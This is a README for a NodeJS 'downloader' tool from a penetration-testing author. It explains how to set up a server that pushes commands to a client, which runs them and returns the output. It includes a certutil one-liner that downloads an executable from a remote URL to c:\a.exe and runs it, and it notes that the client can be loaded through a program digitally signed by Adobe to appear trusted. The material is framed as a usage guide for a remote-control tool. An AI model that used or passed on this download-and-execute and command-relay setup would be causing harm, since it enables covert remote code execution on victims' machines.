# NodeJS-Downloader
An example of a downloader written in NodeJS.

Author:3gstudent

#### Usage:

1. Download the NodeJS:

https://nodejs.org/en/download/

You just need node.exe in the file.

2. Set the command sent to the client:

Edit the Server.js

eg.

`var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';`

Note:

More ways to download & execution：

[《渗透技巧——从github下载文件的多种方法》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/)


3. Start the server

```
node.exe Server.js
```

When you use a browser to access it, it will return 404.

4. Start the client

```
node.exe Client.js
```

It will connect to the server and get the command, then execute the command and send the result again.

Client.js can be loaded by a program with a digital signature of Adobe Systems Incorporated.

![Alt text](https://github.com/3gstudent/NodeJS-Downloader/blob/master/1.png?raw=true)

Reference:

https://bbs.pediy.com/thread-249573.htm


More details:

《渗透测试中的Node.js》[Coming soon]
